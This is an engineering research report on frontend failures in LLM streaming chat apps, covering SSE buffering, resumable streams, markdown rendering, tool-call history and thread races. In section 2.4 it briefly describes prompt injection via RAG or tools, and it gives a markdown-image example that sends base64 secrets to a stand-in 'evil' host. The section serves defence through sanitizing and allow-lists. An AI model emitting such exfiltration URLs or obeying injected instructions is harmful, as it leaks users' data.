# 참고 자료: AI 스트리밍 채팅 프론트엔드에서 실제로 보고된 문제들

> 웹 조사 결과 원문(영문). GitHub 이슈·엔지니어링 블로그·공식 문서 기반이며, 각 항목에 출처 URL이 있다.
> 이 프로젝트 v2 설계의 근거 자료로 사용했다. 대응 현황은 README의 "신뢰성 설계" 표 참고.

# Frontend problems in production LLM streaming chat apps: sourced research report

**Scope:** React frontend concerns, plus the BFF/transport issues that show up in the frontend.
**Our stack (as given):** fetch with a custom SSE parser, and a Node BFF that turns OpenAI Responses API events into `run.started / message.delta / message.completed / run.failed` with `runId` and `seq`. On top of that we have a pure reducer, AbortController, retry before the first token, an idle watchdog, rAF batching, stick-to-bottom scroll and an IME guard.

**Legend:**
- ✅ **ALREADY**: our project covers it. The notes say what to double-check.
- 🆕 **NEW**: not covered.
- ⚠️ **GAP**: we cover the basic case, but a reported edge case can still break it.

Most sources are GitHub issues I read directly (bodies fetched with `gh`). The rest are official docs or engineering posts.

---

## 0. Priority list of NEW ideas (by impact)

| # | Idea | Why it matters | Effort |
|---|---|---|---|
| 1 | **Make Stop a real server-side cancel.** When the BFF sees `req.on('close')`, abort the upstream OpenAI stream. Also add an explicit `POST /runs/:runId/cancel`. | Without it, a client abort keeps generating and billing on the server. This is the most-reported issue in the AI SDK tracker. | S |
| 2 | **Clean up history before each model call.** Handle orphaned tool calls, empty or partial assistant turns, and tool parts left unanswered or waiting for approval. | A single aborted turn can permanently break a conversation ("bricking"). | S–M |
| 3 | **BFF heartbeat, and an idle watchdog that knows about reasoning and tool calls.** Disable proxy buffering and compression for the stream. | Proxies drop silent streams (ALB/nginx 60s, Cloudflare 100s). Reasoning models and slow tools also cause false "stalled" errors. | S |
| 4 | **Idempotency key on retries** (client-generated `requestId`). | "Retry before first token" can bill the same prompt twice if the upstream had already accepted it. | S |
| 5 | **Resume a run from `seq`.** Add `GET /runs/:runId/events?after=<seq>`, triggered on `visibilitychange` / `online` / `pageshow`, not only on mount. | Mobile backgrounding and network changes kill fetch streams. We already have `runId+seq`, so most of the groundwork exists. | M |
| 6 | **Scope runs to a thread inside the reducer.** Ignore events whose `runId` is not the active run for that thread. Explicitly abort or detach the run when the user switches threads. | Reported in vercel/ai, assistant-ui and Coder: the stream writes into the wrong chat. | S |
| 7 | **Map every way a run can end to a distinct UI state.** Error event inside a 200, `response.incomplete` (`max_output_tokens` / `content_filter`), refusal, 429 with Retry-After, 529/overloaded, partial output then error. | Generic "error" handling loses partial text and misleads users. | M |
| 8 | **Streaming markdown done right.** Memoize per block, auto-close unterminated syntax (`remend`), allow-list link and image URLs (blocks data exfiltration), highlight code only after the block closes. | Cost is O(n²) per token; prompt injection can exfiltrate data through image URLs. | M |
| 9 | **Make the reducer forward-compatible.** Ignore unknown event types, drop duplicate `seq`, detect gaps in `seq`. | CopilotKit stalled permanently on unexpected reasoning events. | S |
| 10 | **Performance on long threads.** Apply message snapshots inside `startTransition`, store deltas as chunk arrays instead of `+=`, and add virtualization or `content-visibility` once threads get long. | Measured: navigation delayed about 5s during streaming; O(n²) string copying on long reasoning streams. | M |
| 11 | **Accessibility.** `role="log" aria-live="off"` on the transcript, plus a separate polite status region. | Streaming text inside a live region is broken on every screen reader. | S |
| 12 | **Observability.** Client TTFT, tokens/sec, stall/retry/resume/abort counters, all keyed by `runId`. | We can't tune the watchdog or retry logic without this data. | S |
| 13 | IME extras: Safari `keyCode 229`, and Escape during composition must not cancel the run. Single-flight submit guard. StrictMode-safe send path. | Concrete bugs filed against assistant-ui and the AI SDK. | S |
| 14 | Multi-tab sync, and serving over HTTP/2 (HTTP/1.1 has a 6-connection limit). | Several tabs plus long streams starve each other on HTTP/1.1. | S–M |
| 15 | Message tree (`parentId`) for edit and regenerate. Smooth visual pacing of text. | UX polish. | M |

---

## 1. SSE / streaming transport

### 1.1 Proxy buffering and compression ⚠️ (check the deploy chain)
- **Problem:** nginx buffers proxied responses by default (`proxy_buffering on`, 4–8 KB buffers). gzip/compression middleware also gathers bytes before flushing. Tokens then arrive in bursts, or only when the response ends.
- **Sources:**
  - Production write-up recommending `proxy_buffering off`, `gzip off`, `proxy_read_timeout 86400s` and `X-Accel-Buffering: no`: https://tianpan.co/blog/2025-11-07-streaming-ai-applications-production
  - Express `compression` middleware buffers SSE: https://www.svix.com/resources/guides/server-sent-events-express/
  - Cloudflare streams responses that carry `Content-Type: text/event-stream`: https://developers.cloudflare.com/network/response-buffering
  - A Hugging Face Space commit fixing every buffering source: https://huggingface.co/spaces/ZENLLC/anycoder/commit/4748143a67acdb98742d50e7a917b75ee7241d10
- **What people do:** send `Content-Type: text/event-stream`, `Cache-Control: no-cache, no-transform` and `X-Accel-Buffering: no` from the origin. Exclude the SSE route from compression. Call `res.flushHeaders()` and flush after each event.
- **For us:** in the BFF, skip `compression()` for `/runs/*`, or use `filter: req => !isSSE(req)`. Set all three headers. Verify with `curl -N` through every hop (Vite proxy in dev, nginx/ALB/CDN in prod). Write the first byte immediately (for example `: ok\n\n`). That also tells the client the connection is open, which lets "retry before first token" tell a connect failure apart from a slow model.

### 1.2 Idle timeouts and heartbeats 🆕 (BFF heartbeat) ⚠️ (watchdog calibration)
- **Problem:** intermediaries kill silent connections. Typical limits are AWS ALB 60s, nginx `proxy_read_timeout` 60s, Cloudflare 100s (524; cannot be raised on Free/Pro), and AWS Service Connect around 15s. Streams go silent for long stretches during reasoning ("thinking") or slow tool calls. Worse, heartbeat comments can get stuck in an upstream buffer, so the downstream proxy still sees silence.
- **Sources:**
  - Incident write-up, "The SSE keep-alive your reverse proxy stripped, and the prompt you paid for twice": https://tianpan.co/blog/2026/06/03/the-sse-keepalive-your-reverse-proxy-stripped-between-provider-and-client
  - OpenAI community thread on 524 gateway timeouts (users report being billed anyway): https://community.openai.com/t/gpt-4-api-gateway-timeout-for-long-requests-but-billed-anyway/177214/56
  - Mitigation guide for Cloudflare and ALB: https://smartscope.blog/en/Infrastructure/sse-timeout-mitigation-cloudflare-alb/
- **What people do:**
  - Send `: heartbeat\n\n` every 15–30s, and keep the interval under half of the smallest idle timeout in the chain.
  - Raise ALB idle timeout to 300s.
  - Disable buffering so the heartbeat actually travels.
- **For us:**
  - The BFF should emit its own heartbeat every 10–15s, either an SSE comment or a typed `run.heartbeat` event that includes `runId` and the last `seq`.
  - The **client idle watchdog should reset on heartbeats**, but count them separately from content deltas. That way it can show "Thinking…" or "Running tool…" instead of failing.
  - Forward a coarse `run.progress` event (phase: `reasoning | tool | generating`) from Responses events such as `response.reasoning_summary_*`, `response.output_item.added` (function_call) and `response.in_progress`. The UI can then explain the silence, and the watchdog threshold can depend on the phase. For example: 20s without anything while generating counts as a stall; during reasoning or a tool call, only a missing heartbeat counts.

### 1.3 EventSource limits ✅ (we use fetch) and the HTTP/1.1 connection limit 🆕
- **Problem:** `EventSource` only does GET, can't set custom headers or a body, and reconnects automatically (which re-sends the request). On HTTP/1.1, browsers allow about **6 connections per origin across all tabs**. Long-lived streams in several tabs block every other request. Chrome and Firefox closed this as "Won't fix".
- **Sources:**
  - Eric Lawrence, "The Pitfalls of EventSource over HTTP/1.1": https://textslashplain.com/2019/12/04/the-pitfalls-of-eventsource-over-http-1-1/
  - MDN EventSource: https://developer.mozilla.org/en-US/docs/Web/API/EventSource
- **For us:** fetch plus our own parser already avoids the GET-only and header limits. Still:
  - Make sure production serves the BFF over **HTTP/2 or HTTP/3**, end to end to the browser.
  - The Vite dev proxy is HTTP/1.1, so opening 6 or more tabs with active streams in dev will starve other requests. Expect it and document it.
- **Library gotcha if anyone adopts `@microsoft/fetch-event-source`:** it closes the connection when the document becomes hidden and reconnects when it's visible again (`openWhenHidden` default). For a POST that starts generation, the reconnect **re-sends the request and starts a duplicate generation**. Docs: https://github.com/Azure/fetch-event-source

### 1.4 Resumable streams, Last-Event-ID, and the cursor 🆕 (high value: we already have `runId+seq`)
- **Problem:** a reload, a network change, or mobile backgrounding kills the fetch stream. Without resume, the partial answer is lost, or the user re-sends and pays twice.
- **Sources:**
  - AI SDK resumable streams (Redis plus the `resumable-stream` package, `POST` to create and `GET /api/chat/[id]/stream` to resume, `activeStreamId` per chat): https://ai-sdk.dev/docs/ai-sdk-ui/chatbot-resume-streams
  - **Caveat in the same docs:** resume is incompatible with abort. Their fix is a dedicated `/api/chat/[id]/stop` endpoint: https://ai-sdk.dev/docs/troubleshooting/abort-breaks-resumable-streams
  - **vercel/ai #11865 (open):** resume only runs on mount. Tab switches and mobile backgrounding leave the stream dead because nothing listens to `visibilitychange`. iOS Safari with the page kept in memory and Android Chrome both stay broken. https://github.com/vercel/ai/issues/11865
  - **vercel/ai #18458:** `stop()` couldn't end a *resumed* stream because the abort signal wasn't passed to `reconnectToStream`. The replay kept writing into chat state, and switching chats could leave "a detached replay running". https://github.com/vercel/ai/issues/18458
  - **vercel/ai #15870:** two overlapping `resumeStream()` calls race on `activeResponse` and throw. https://github.com/vercel/ai/issues/15870
  - LibreChat resumable architecture: a generation job records every delta (text, tool calls, citations, reasoning). On reconnect the server rebuilds content from the recorded deltas and continues. Redis Streams/PubSub are used for multi-instance setups, and the same mechanism keeps several tabs in sync. https://www.librechat.ai/docs/features/resumable_streams
  - **OpenAI native option:** create the response with `background: true, stream: true`, track `sequence_number`, then resume with `GET /v1/responses/{id}?stream=true&starting_after=N`; cancel with `POST /responses/{id}/cancel` (idempotent). https://developers.openai.com/api/docs/guides/background
    - TTFT is higher in background mode.
    - ZDR or Modified Abuse Monitoring projects keep the data only about 10 minutes.
    - Users report `"This response can no longer be streamed because it is more than 5 minutes old"`: https://community.openai.com/t/stream-background-this-response-can-no-longer-be-streamed-because-it-is-more-than-5-minutes-old/1372287
  - Ably's critique of what AI SDK resume does and doesn't cover: https://ably.com/vercel/vercel-ai-sdk-resumable-stream-what-it-covers-and-what-it-doesnt
- **For us:**
  1. **BFF:** keep a short-lived event log per run (in memory for a single instance, Redis Streams for several), keyed by `runId` and holding the normalized events with their `seq`. Decouple upstream consumption from the client connection: keep reading from OpenAI even if the client drops, until it completes or an explicit cancel arrives.
  2. **Endpoint:** `GET /runs/:runId/events?after=<lastSeq>`. This could also accept the `Last-Event-ID` header if we emit `id: <seq>` lines. It replays from the log, then continues live. Return 204 or `run.gone` if the run expired.
  3. **Client triggers for resume:** mount (when the thread has an `activeRunId`), `visibilitychange → visible`, `online`, `pageshow` (persisted: bfcache restore), and a reader error that is *not* an AbortError after the first token. Today our "retry before first token" stops at the first token; resume picks up from there.
  4. **Reducer:** apply events only when `seq === lastSeq + 1`. Drop duplicates (`seq <= lastSeq`). On a gap, request a resume from `lastSeq`.
  5. **Single flight:** at most one active reader per `runId`. Abort the old reader before opening a resume (avoids the #15870 and #18458 races). Pass the same AbortController to resume as to the original request.
  6. **Resolve the abort-vs-resume conflict** with an explicit cancel endpoint (§6.6). A client disconnect is then never treated as a cancel.

### 1.5 Mobile background, tab switching, network change 🆕 (covered by resume above)
- **Problem:** iOS suspends JS and network for backgrounded pages. Wi-Fi to cellular handoffs end the stream with `TypeError: network error` or a silent stall. Chrome and Safari surface this differently (Safari/WebView throw; Chrome may just stall).
- **Sources:**
  - vercel/ai #11865 above.
  - basehub forum, "Why does my message stream stop on mobile?": https://forums.basehub.com/basehub-ai/forums/6
  - Claude Code issue: messages disappear when switching tabs during streaming: https://github.com/anthropics/claude-code/issues/44480
- **For us:**
  - Treat `visibilitychange → hidden` as "expect a drop": record `lastSeq`, and don't show an error.
  - On `visible`, if the run isn't terminal and no delta arrived in the last N seconds, resume proactively.
  - Never let the idle watchdog fire while `document.hidden`; browsers throttle timers in background tabs anyway.

---

## 2. Streaming markdown rendering

> We weren't told what the project does here, so this whole section is marked 🆕.

### 2.1 Re-parsing on every token costs O(n²) 🆕
- **Problem:** `react-markdown` re-parses and re-renders the whole message on each token. Cost grows with message length times token count, and long answers start dropping frames.
- **Sources:**
  - AI SDK cookbook, "Markdown chatbot with memoization": split with `marked.lexer()` into blocks and render each block in a `React.memo` component, so only the last block re-renders. https://ai-sdk.dev/cookbook/next/markdown-chatbot-with-memoization
  - Chrome team, "Best practices to render streamed LLM responses". Avoid `textContent +=` and `innerHTML +=`; use a streaming parser (`streaming-markdown`) that appends DOM nodes, plus DOMPurify. https://developer.chrome.com/docs/ai/render-llm-responses
  - Incremental parsers: Show HN thread https://hn.svelte.dev/item/48142119 ; `mdtext` (linear, versus quadratic for re-parsing) https://docs.rs/crate/mdtext/latest
- **For us:**
  - Keep a per-message cache: `{ stableBlocks: string[], tail: string }`. When a delta arrives, run the lexer only on `tail` plus the delta (fall back to a full lex every N KB to stay correct). Move finished blocks into `stableBlocks`; each renders in a memoized `<Block key={idx} src={...}/>`.
  - This pairs well with rAF batching (§3.1). Batching cuts render *frequency*; block memoization cuts *cost per render*.

### 2.2 Incomplete syntax: code fences, bold, links, tables 🆕
- **Problem:** an unclosed ```` ``` ```` turns the rest of the message into code. A half-typed `**` or `[link](` flashes raw syntax, and half-built tables jump around.
- **Sources:**
  - Vercel **Streamdown** (drop-in for react-markdown) and the standalone **`remend`** preprocessor that closes unterminated fences, emphasis and links. https://vercel.com/changelog/new-npm-package-for-automatic-recovery-of-broken-streaming-markdown and https://github.com/vercel/streamdown
  - **streamdown #539:** remend can't decide ambiguous tails (`my name is **`, `- item\n - `). The result is a flash of unstyled markdown. The proposed fix is to *hold back* an ambiguous tail until it resolves. https://github.com/vercel/streamdown/issues/539
  - **streamdown #328:** a regression where text "gets stuck" on very fast streams (gpt-oss on Groq). Expensive per-chunk work blocked rendering. https://github.com/vercel/streamdown/issues/328
  - **streamdown #357:** the browser froze on Go code with backticks in struct tags, from catastrophic regex backtracking in `marked`. https://github.com/vercel/streamdown/issues/357
- **For us:**
  - Run `remend` (or our own small "close open fences and emphasis" pass) on the **tail block only**, before rendering.
  - Hold back the last 1–3 characters when they could start markdown syntax (`*`, `_`, `` ` ``, `[`, `|`, `-` at the start of a line) until the next delta or completion.
  - Render tables only after the header separator row has arrived.
  - Add a fuzz test with adversarial inputs (from #357) to guard against regex DoS.

### 2.3 Syntax highlighting cost and flicker (shiki) 🆕
- **Problem:** shiki is async and heavy. Re-highlighting on each token costs CPU and causes flicker (the code shows unhighlighted for a frame). Virtualized lists re-mount code blocks and re-highlight them.
- **Sources:**
  - **streamdown #402**, code block highlight flicker while streaming: https://github.com/vercel/streamdown/issues/402
  - **streamdown #186**, flicker in virtual lists from async shiki (no cache across mounts): https://github.com/vercel/streamdown/issues/186
  - assistant-ui skips highlighting entirely while the block is streaming and renders the same plain code shiki will later tokenize, so there is no layout shift: https://www.assistant-ui.com/docs/ui/syntax-highlighting
  - `react-shiki` (throttled re-highlighting): https://npmjs.com/package/react-shiki
  - `shiki-stream` by antfu: https://github.com/antfu/shiki-stream
- **For us:**
  - Render plain `<pre><code>` with the *same font and padding* while the fence is open; highlight once it closes.
  - Cache highlighted HTML by `hash(lang+code)` in a module-level LRU so re-mounts are instant.
  - Lazy-load languages, and use one shared highlighter singleton.

### 2.4 XSS and data exfiltration in LLM output 🆕 (security)
- **Problem:** model output is untrusted (prompt injection through RAG, tools or web content). `rehype-raw` or `dangerouslySetInnerHTML` enables XSS. Even with HTML stripped, markdown images like `![](https://evil/?q=<base64 secrets>)` leak data with zero clicks.
- **Sources:**
  - GitLab Duo remote prompt injection: https://simonwillison.net/2025/May/23/remote-prompt-injection-in-gitlab-duo/
  - The "lethal trifecta": https://simonwillison.net/random/lethal-trifecta/
  - AnythingLLM stored XSS through image alt text and chart captions: https://blog.quarkslab.com/from-prompt-to-pwned-chaining-llm-and-web-bugs-to-admin.html
  - Vercel `harden-react-markdown` / `rehype-harden` with `allowedLinkPrefixes` / `allowedImagePrefixes`; note that prefix lists can be bypassed through open redirects: https://cdn.jsdelivr.net/npm/harden-react-markdown@1.1.8/README.md
  - Streamdown security docs: https://streamdown.ai/docs/security
- **For us:**
  - Never use `rehype-raw` on model output.
  - Add `rehype-sanitize` or `rehype-harden`, with an image allow-list (only our CDN, or no remote images at all) and a link protocol allow-list (`https:`, `mailto:`).
  - Add `rel="noopener noreferrer nofollow"` and `target=_blank` to links.
  - Set a CSP `img-src` as a second layer of defense.

---

## 3. Rendering performance

### 3.1 A re-render per token ✅ (rAF batching)
- **Sources:**
  - AI SDK `experimental_throttle`: by default the UI re-renders on every chunk, which can overload rendering, especially for Markdown. https://ai-sdk.dev/docs/troubleshooting/react-maximum-update-depth-exceeded
  - **vercel/ai #18547 (open):** proposes a **50ms default cadence** in v8. The earlier throttle let unrelated renders read the latest `chat.messages` on every chunk, bypassing the throttle (fixed in #18525). https://github.com/vercel/ai/issues/18547
- **Check in our code:** make sure the *store snapshot* is what we batch, not only the subscriber callback. If other components read the raw store directly, they bypass rAF (the bug fixed in #18525). Consider about 33–50ms instead of every frame on low-end devices. Flush immediately on terminal events (`message.completed` / `run.failed`), so a terminal status never renders next to stale partial text.

### 3.2 Urgent streaming updates starve navigation and transitions 🆕
- **Problem:** `useSyncExternalStore` updates always run as urgent (SyncLane), even inside a transition. Each streamed snapshot interrupts and restarts any concurrent render (route change, heavy panel). Navigation then waits for React's 5s expiration of the starved transition.
- **Source:** **vercel/ai #21849.** Measured click-to-commit with 4x CPU throttling: **5,423ms with useChat versus 523ms** when snapshots were applied inside `startTransition`. `useDeferredValue` didn't help; a bigger throttle only moved the threshold. https://github.com/vercel/ai/issues/21849
- **For us:**
  - Inside the rAF flush, apply message *content* updates with `startTransition(() => setMessages(...))`.
  - Keep `status` and `error` urgent, and flush content urgently right before switching to a terminal status.
  - This matters if we use React Router transitions or heavy side panels.

### 3.3 O(n²) string accumulation 🆕
- **Problem:** `part.text += delta`, combined with reading `.text` between writes (renders), forces V8 to flatten the string and copy it each time. That's quadratic on long reasoning or long output streams.
- **Source:** **vercel/ai #15670 (open):** a 10k × 200-char stream reproduces it. https://github.com/vercel/ai/issues/15670
- **For us:** in the reducer, store `chunks: string[]` (or a rope) and derive `text` lazily and memoized, once per rAF flush. Don't concatenate in the reducer on every event.

### 3.4 Virtualization of long threads 🆕 (when needed)
- **Problem:** long chats get slow (typing lag, scroll jank). Complaints are common for ChatGPT itself and Open WebUI.
- **Sources:**
  - "ChatGPT typing lag in long chats — needs virtual scroll": https://community.openai.com/t/chatgpt-typing-lag-in-long-chats-needs-virtual-scroll-like-yesterday/1273495
  - Open WebUI #2078 (sidebar loading all chats): https://github.com/open-webui/open-webui/issues/2078
  - **TanStack Virtual chat mode:** `anchorTo: 'end'`, `followOnAppend`, `scrollEndThreshold`, keyed prepend stability, and it handles the last item growing while streaming. https://tanstack.com/blog/tanstack-virtual-chat and https://tanstack.com/virtual/latest/docs/chat
  - Virtualization breaks async code highlighting (streamdown #186 above).
- **For us:**
  - Cheap first step: `content-visibility: auto; contain-intrinsic-size: auto 400px` on finished message rows.
  - Full virtualization only past roughly 100 or more messages. It interacts with stick-to-bottom, so use a library with end anchoring rather than combining two scroll managers.
  - Make the composer input independent of the message list, so typing never re-renders the list (the typing-lag reports).

### 3.5 Smooth visual pacing 🆕 (polish)
- **Problem:** tokens arrive in clumps (a pause, then a whole sentence), so text stutters.
- **Sources:**
  - AI SDK `smoothStream({ chunking: 'word' | 'line', delayInMs })`: https://ai-sdk.dev/docs/reference/ai-sdk-core/smooth-stream
  - Upstash, "Smooth streaming" (client-side decoupling): https://upstash.com/blog/smooth-streaming
- **For us:** an optional client-side "drain" that shows buffered text at an adaptive rate (faster when the backlog grows) inside our rAF loop. Never delay the terminal flush.

### 3.6 Auto-scroll "stick to bottom" ✅ ⚠️ (known edge cases)
- **Sources:**
  - `use-stick-to-bottom` by StackBlitz: ResizeObserver plus spring-based scrolling, works without Safari's missing `overflow-anchor`, and the user can escape by scrolling up. https://github.com/stackblitz-labs/use-stick-to-bottom
  - **assistant-ui #8205:** content that grows *without a DOM mutation* isn't followed (autosizing textarea, collapsible height animations, `<img>` load, late web fonts), and `isAtBottom` stays true, so the jump button stays hidden. https://github.com/assistant-ui/assistant-ui/issues/8205
  - **assistant-ui #8220:** a user scroll-up in the same frame as a programmatic scroll is missed, and the next growth snaps back down (happens with inertial scrolling). https://github.com/assistant-ui/assistant-ui/issues/8220
  - **assistant-ui #8211:** stopping a scroll just short of the bottom leaves the jump button hidden. https://github.com/assistant-ui/assistant-ui/issues/8211
  - **assistant-ui #8367:** a request to pause auto-scroll while the user expands collapsible content. https://github.com/assistant-ui/assistant-ui/issues/8367
  - **use-stick-to-bottom #32:** Safari at 85% zoom jumps endlessly (sub-pixel `scrollTop` rounding). https://github.com/stackblitz-labs/use-stick-to-bottom/issues/32
  - **use-stick-to-bottom #9:** bad on iOS. https://github.com/stackblitz-labs/use-stick-to-bottom/issues/9
  - **use-stick-to-bottom #40:** drift when the container itself resizes (flex sibling, such as a growing composer). https://github.com/stackblitz-labs/use-stick-to-bottom/issues/40
  - Opening a Codex app thread starts at the top instead of the end: https://community.openai.com/t/when-changing-thread-in-codex-app-chat-is-rendered-from-the-beginning-need-to-manually-scroll-to-the-end-of-the-chat/1373595
- **Checks for us:**
  - The ResizeObserver should watch the *content* element, not rely on MutationObserver.
  - Detect user intent from `wheel`/`touchmove`/`keydown` (PageUp/Up), not only `scrollTop` deltas.
  - Use a tolerance of at least 2px for "at bottom" (Safari zoom).
  - Observe the scroll container's own size too, since a growing composer shrinks it (#40).
  - Jump to the bottom instantly (not smooth) when switching threads.

---

## 4. Tool calls and generative UI
(Relevant once our BFF forwards function calls.)

### 4.1 Streaming partial JSON arguments 🆕
- **Problem:** tool arguments stream as JSON fragments (OpenAI `response.function_call_arguments.delta`, Anthropic `input_json_delta`). Repairing and parsing the whole prefix on every delta is O(n²) and stutters.
- **Sources:**
  - tianpan production post, "naive incremental JSON repair is O(n²), causing visible stuttering": https://tianpan.co/blog/2025-11-07-streaming-ai-applications-production
  - The AI SDK 5 tool part state machine: `input-streaming → input-available → output-available | output-error`, plus `approval-requested`, `approval-responded`, `output-denied`.
- **For us:**
  - Normalize into `tool.started{toolCallId,name}`, `tool.args.delta`, `tool.args.completed{args}`, `tool.result{output}` and `tool.failed{error}`.
  - The client parses partial args with `partial-json` (or `best-effort-json-parser`), **throttled** to the rAF flush. Ideally it parses only when the component needs a preview.
  - Render tools from a registry `{ [toolName]: Component }` with a fallback component for unknown tools.

### 4.2 Orphaned tool calls after abort brick the conversation 🆕 (high impact)
- **Problem:** the user stops mid-tool-call, or ignores an approval prompt. The persisted history then holds a tool call without a result. On the next request the provider returns 400:
  - OpenAI: `messages with role 'tool' must be a response to a preceding message with 'tool_calls'`, or the reverse (tool call without output).
  - Anthropic: `tool_use ids were found without tool_result blocks immediately after`.
  - Strict chat templates: `Conversation roles must alternate`.
  - Every later message in that thread fails.
- **Sources:**
  - **vercel/ai #18425:** an abort during input-streaming persisted the tool part with `input: {}` as `output-available`. Validation then threw on *every* later request, "permanently bricking the conversation". It hit production months after the abort. https://github.com/vercel/ai/issues/18425
  - **vercel/ai #18451:** `ignoreIncompleteToolCalls` didn't filter `approval-requested` or state-less parts, leaving orphaned tool calls (`AI_MissingToolResultsError`). https://github.com/vercel/ai/issues/18451
  - **LibreChat #11460:** after an abort, empty or partial assistant messages break role alternation on vLLM/Mistral. The proposed fix is to sanitize history by merging same-role messages, dropping empty unfinished assistant turns and enforcing alternation. https://github.com/danny-avila/LibreChat/issues/11460
  - **vercel/ai #11813:** "Duplicate item found with id fc_…" when using OpenAI server-side conversation state *and* re-sending history items. https://github.com/vercel/ai/issues/11813
  - AI SDK troubleshooting, missing tool results: https://ai-sdk.dev/docs/troubleshooting/missing-tool-results-error
  - LangChain INVALID_TOOL_RESULTS: https://js.langchain.com/docs/troubleshooting/errors/INVALID_TOOL_RESULTS
- **For us (BFF-side, a `sanitizeHistory()` before every Responses call):**
  - For each `function_call` item without a matching `function_call_output`, either drop it, or synthesize an output `{"error":"cancelled_by_user"}`. Synthesizing keeps the model aware of what happened.
  - Drop assistant messages that are empty or were aborted with no content. Keep partial text but mark it, for example by appending "[response interrupted by user]" or storing `status: 'aborted'`.
  - Use **one** source of history: either `previous_response_id`/`conversation`, or a full re-send of items. Mixing them caused #11813.
  - Validate tool inputs leniently for terminal parts; never re-validate historic tool args against the current schema.
  - Write a regression test: abort at every phase (before first token, mid-text, mid-tool-args, waiting for approval), then send another message. It must succeed.

### 4.3 Human-in-the-loop approvals 🆕
- **Sources:**
  - CopilotKit `useHumanInTheLoop` (formerly `renderAndWaitForResponse`): the render function gets `respond()`, and the agent waits until it's called. https://docs.copilotkit.ai/reference/hooks/useHumanInTheLoop
  - AI SDK `needsApproval` with the `approval-requested` / `approval-responded` / `output-denied` states.
- **For us:**
  - Model approval as a run state `awaiting_approval` with `toolCallId`.
  - Persist it so a reload shows the prompt again.
  - Starting a new user message while an approval is pending must auto-deny it (writing a `function_call_output` "denied"). Otherwise you get the #18451 failure.

### 4.4 Parallel tool calls and ordering 🆕
- **For us:** key tool UI by `toolCallId`, not by array index. Responses events carry `output_index` and `item_id`, so forward them and order by `output_index`. Results can arrive in any order, so only finish the assistant turn when every call is terminal.

### 4.5 Unknown or new event types stall the client 🆕
- **Source:** **CopilotKit #3323:** when Anthropic thinking produced `REASONING_*` events, the agent stalled permanently after the thinking phase. Stripping those events fixed it. https://github.com/CopilotKit/CopilotKit/issues/3323
- **For us:**
  - The reducer must **ignore unknown event types**: log them, don't throw, don't change status.
  - The BFF should map unknown Responses events to nothing, or to a generic `run.progress`. A new OpenAI event type must never break the UI.
  - Add a unit test that feeds an unknown event in the middle of a stream.

---

## 5. State and session management

### 5.1 Switching threads while streaming 🆕 (high impact)
- **Problem:** the stream keeps writing into whichever thread is currently shown, or the old thread's status stays stuck at "submitted".
- **Sources:**
  - **vercel/ai #696:** switching chat id during streaming overwrites the new chat's data. https://github.com/vercel/ai/issues/696
  - **vercel/ai #5015:** changing `id` keeps streaming into the new chat. Calling `stop` in cleanup leaves status `submitted`. https://github.com/vercel/ai/issues/5015
  - **vercel/ai #819:** `isLoading` stuck `true` if the id changes before streaming starts. https://github.com/vercel/ai/issues/819
  - **assistant-ui #7037:** AG-UI thread switching leaves the previous HTTP request running. https://github.com/assistant-ui/assistant-ui/issues/7037
  - **assistant-ui #6477:** switching threads merged histories into sibling branches. https://github.com/assistant-ui/assistant-ui/issues/6477
  - **assistant-ui #8163:** an unsent edit inside an interactive tool UI is lost after switching threads and back. https://github.com/assistant-ui/assistant-ui/issues/8163
  - Coder fixed races where old-chat stream parts applied after the new chat's state was cleared: https://git.dragonfruit.dev/mirror/coder/commit/1a87e74574c2429bf87b5529bd8e899b57fbd8a2 (the page returned 403 to me; the summary comes from search results)
- **For us:**
  - The store should be `byThread[threadId] = { messages, activeRunId, lastSeq, status }`.
  - Every streamed event carries `runId`. The BFF should also include `threadId`, or the client keeps a `runId → threadId` map.
  - The reducer drops any event where `runId !== byThread[threadId].activeRunId`. This guard is the core fix.
  - Pick a policy explicitly:
    - (a) Abort on switch: call `abort()` *and* reset the old thread's status to `idle` or `aborted`, persisting the partial text.
    - (b) Keep it running in the background, ChatGPT-style. The stream continues into its own thread's state, and the sidebar shows a spinner. This requires the per-thread store and a stable reader that doesn't depend on the mounted component.
  - Never hold the reader inside a component's `useEffect` closure, which dies on unmount. Keep it in a module-level run manager keyed by `runId`.

### 5.2 StrictMode double effects and duplicate requests ✅⚠️
- **Source:** **vercel/ai #7891:** starting a conversation from `useEffect` (an initial prompt from props) under StrictMode called the API twice and opened two streams. https://github.com/vercel/ai/issues/7891 ; React issue #24502: https://github.com/facebook/react/issues/24502
- **For us:**
  - Start sends only from event handlers.
  - For "auto-send initial prompt" flows, guard with a `requestId` generated once (in a ref or the URL) that the BFF de-duplicates (see the idempotency key, §6.3).
  - Effect cleanup should abort only readers that *that* effect created.

### 5.3 Stale closures in streaming callbacks ✅ (pure reducer)
- **For us:** a pure reducer with dispatch already avoids most of this. Double-check that `onDone`/`onError` callbacks read the latest thread and run through refs or the store, not through captured props.

### 5.4 Double submit 🆕 (small)
- **Source:** **assistant-ui #3577:** submitting attachments with empty text triggered two `stream()` calls and two user bubbles. https://github.com/assistant-ui/assistant-ui/issues/3577
- **For us:**
  - Single-flight guard: set `submitting` synchronously in a ref before any `await`, and disable while `status ∈ {submitting, streaming}`.
  - Build text and attachments into one message.
  - The server de-duplicates by `requestId`.

### 5.5 Persisting partial messages, message IDs, optimistic messages 🆕
- **Sources:**
  - AI SDK `onAbort` / `consumeStream` let you persist partial results on abort or disconnect: https://ai-sdk.dev/docs/advanced/stopping-streams
  - vercel/ai #7253 (partial UIMessage collection on abort), referenced inside #18425.
- **For us:**
  - The client creates the user message ID (UUID) and the assistant placeholder ID up front.
  - The BFF echoes them in `run.started{ runId, userMessageId, assistantMessageId }` so optimistic and server copies reconcile without duplicates.
  - The BFF persists the assistant message with `status: streaming | completed | aborted | failed | incomplete` as it goes. Persisting on completion alone isn't enough.

### 5.6 Branching, edit, regenerate 🆕
- **Sources:**
  - Ably AI Transport conversation tree: each node has `parentMessageId`; edit and regenerate create siblings; the server builds history up to the fork point. https://ably.com/docs/ai-transport/features/branching
  - assistant-ui ExternalStoreRuntime enables features by handler: `setMessages` turns on branch switching, `onEdit` editing, `onReload` regenerate. https://www.assistant-ui.com/docs/runtimes/custom/external-store
  - LangChain branching chat: https://docs.langchain.com/oss/python/langchain/frontend/branching-chat
- **For us:** store messages as a tree (`parentId`) plus `activeLeafId` per thread, and derive the visible path. Regenerate is a new run with `parentId = userMessageId`. Edit creates a new user sibling and then a run. Combine this with §4.2 so the branch history sent to the model is valid.

### 5.7 Multi-tab sync 🆕
- **Sources:** the LibreChat resumable design keeps several tabs viewing the same conversation in sync through one job. Also see the HTTP/1.1 connection limit in §1.3.
